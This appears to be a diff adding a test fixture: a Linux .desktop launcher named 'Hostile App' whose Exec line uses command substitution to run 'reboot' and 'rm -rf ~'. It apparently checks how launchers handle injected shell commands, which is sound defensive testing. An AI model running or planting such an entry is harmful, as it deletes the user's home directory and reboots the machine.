@@ -1,0 +1,6 @@
+[Desktop Entry]
+Type=Application
+Name=Hostile App
+Exec=sh -c "echo $(reboot); rm -rf ~; `whoami`" %f %u %i %c %k
+Icon=system-run
+Categories=Utility;
